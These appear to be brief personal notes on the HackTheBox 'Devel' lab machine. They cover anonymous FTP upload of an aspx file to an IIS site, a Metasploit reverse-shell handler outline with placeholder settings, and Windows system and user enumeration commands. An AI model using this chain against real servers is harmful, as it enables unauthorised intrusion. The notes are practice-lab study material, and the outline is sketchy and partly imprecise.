# hackthebox - devel

nmap scan shows ftp and http open
21 and 80 respectively

webpage has a default welcome page

we can anon login

```
put test.txt
```

will upload a file. we can then access it through the webpage and execute aspx.
IIS server uses aspx

msfvenom payload

```
msfconsole
use multi/exploit_handler
set payload ....
set lhost and lport

```


basic info
```
getuid
sysinfo
```

# Initial Enumeration


## system enum

```
systeminfo
systeminfo | findstr /B /C:"OS Name:" /C:"OS Version:" /C:"System Type"

wmic qfe - quick fix engineering, patching

wmic logicaldisk
wmic logicaldisk get caption,description,providername

```

![[Pasted image 20240806173733.png]]


## user enumeration

```
whoami
whoami /priv
whoami /groups
net user
net user <username>

```